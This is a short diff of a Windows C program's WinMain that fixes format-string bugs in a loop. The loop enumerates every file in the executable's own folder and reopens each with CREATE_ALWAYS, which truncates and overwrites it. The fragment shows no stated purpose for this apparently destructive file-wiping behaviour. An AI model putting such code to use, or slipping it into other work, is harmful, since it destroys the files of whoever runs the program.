@@ -184,7 +184,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLin
 					GetModuleFileNameA(NULL, ExePath, MAX_PATH);
 					PathRemoveFileSpecA(ExePath);
 
-					wsprintfA(search, "s%\\*.*", ExePath);
+					wsprintfA(search, "%s\\*.*", ExePath);
 
 					// SECRET COMMENT: INCREMENT MY BUTT
 					HANDLE hFind = FindFirstFileA(search, &winfda);
@@ -197,7 +197,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLin
 						{
 							// build full file path
 							char FullFPath[MAX_PATH];
-							wsprintfA(FullFPath, "%s\\%s");
+							wsprintfA(FullFPath, "%s\\%s", ExePath, winfda.cFileName);
 
 							// createalways overwrites
 							HANDLE hFile = CreateFileA(FullFPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
